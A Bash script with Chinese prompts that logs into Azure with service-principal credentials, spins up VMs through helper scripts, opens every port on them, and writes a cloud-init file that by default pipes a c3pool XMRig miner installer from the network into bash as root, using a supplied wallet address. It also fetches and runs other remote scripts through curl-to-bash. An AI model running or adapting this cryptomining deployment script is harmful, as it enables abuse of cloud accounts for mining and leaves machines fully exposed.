#!/bin/bash
if [ ! -f "./.XX/cloud-shell/fuckb1s.py" ]; then
echo '第一次执行初始化...'
/usr/bin/python3 -m pip install --upgrade pip
pip install azure-cli
         mkdir ./.XX/cloud-shell
         git clone https://github.com/sunianOvO/fuckaz/ ./.XX/cloud-shell/ 2>/dev/null
         chmod -R 777 ./.XX/cloud-shell
         cp -f ./.XX/cloud-shell/fuckaz.sh /bin/fuckaz
         echo '初始化完成!'
         echo '输入 fuckaz 命令使用本项目！'
     fi
    
if [[ $1 == 'update' ]]
  then
  echo '升级覆盖中...'
  rm -rf ./.XX/cloud-shell
  fuckaz
elif [[ $1 == 'check' ]]
  then
  bash <(curl -Ls https://raw.githubusercontent.com/sunianOvO/fuckaz/main/check.sh)
  exit 0
elif [[ $1 == 'screen' ]]
  then
  bash <(curl -Ls https://raw.githubusercontent.com/sunianOvO/fuckaz/main/screen.sh)
  exit 0
fi
if [[ $4 ]]
then
  if [[ $4 == 'rm' ]]
  then
      az group delete --name ResourceGroup --no-wait --yes
  elif [[ $4 == 'read' ]]
  then
    echo '请输入自定义开机脚本:'
    read shell
    echo "#cloud-config
runcmd:
  - sudo -s
  - ${shell}
  - "> ./.XX/cloud-shell/cloud-init.txt
  elif [[ $4 == 'null' ]]
  then
     echo '将以已存在的 cloud-init.txt 为开机脚本，请确认脚本内容是否需要修改？(5秒后自动执行)'
     echo "#####################"
     echo "$(cat ./.XX/cloud-shell/cloud-init.txt)"
     echo "#####################" 
     echo '请确认开机代码无误！！！'
     sleep 5
   else
echo '你输入的钱包地址为:'
echo "#####################"
echo "$4"
echo "#####################" 
echo '请确认钱包地址无误！！！'
echo "#cloud-config
runcmd:
  - sudo -s
  - export HOME=/root && curl -s -L http://download.c3pool.org/xmrig_setup/raw/master/setup_c3pool_miner.sh | LC_ALL=en_US.UTF-8 bash -s $4
  - "> ./.XX/cloud-shell/cloud-init.txt
  fi
else
echo ':) 重要参数丢失!'
echo '示例命令:'
echo '自定义钱包地址:  fuckaz appid passwd tenant 钱包地址'
echo '使用默认开机自启文件:  fuckaz appid passwd tenant null'
echo "#####################"
echo 'debian /Ubuntu 系统请执行 dpkg-reconfigure dash 选择 no 然后再使用 fuckaz 命令否则报错'
echo "#####################"
exit 250
fi
     
az logout
az login --service-principal --username $1 --password $2 --tenant $3
rm -f ./.XX/cloud-shell/ip.txt
rm -f ./.XX/cloud-shell/ip1.txt
rm -f ./.XX/cloud-shell/ip2.txt
rm -f /root/.ssh/known_hosts
python3 ./.XX/cloud-shell/fuckb1s.py
python3 ./.XX/cloud-shell/fuckd2as.py
python3 ./.XX/cloud-shell/fucke2bds.py
rm -f ./.XX/cloud-shell/fuck.txt
az vm list -d > ./.XX/cloud-shell/fuck.txt
az vm open-port --ids $(az vm list -g ResourceGroup --query "[].id" -o tsv) --port '*'
cat ./.XX/cloud-shell/fuck.txt | sed 's/,/\n/g' | grep "publicIps" | sed 's/:/\n/g' | sed '1d' | sed 's/}//g' | sort -u > ./.XX/cloud-shell/ip.txt
sed -r 's/["]{1,10}$//' ./.XX/cloud-shell/ip.txt > ./.XX/cloud-shell/ip1.txt
cat ./.XX/cloud-shell/ip1.txt | sed s/[[:space:]]//g  | sort -u > ./.XX/cloud-shell/ip2.txt
rm -f ./.XX/cloud-shell/ip1.txt 
rm -f ./.XX/cloud-shell/ip.txt
mv ./.XX/cloud-shell/ip2.txt ./.XX/cloud-shell/ip.txt
sed -i '$d' ./.XX/cloud-shell/ip.txt
sed -i 's/.//' ./.XX/cloud-shell/ip.txt
cat ./.XX/cloud-shell/ip.txt
echo "#####################"
echo "共计开机 $(cat ./.XX/cloud-shell/ip.txt|wc -l) 台"
echo "用时  $SECONDS 秒"
echo "#####################"
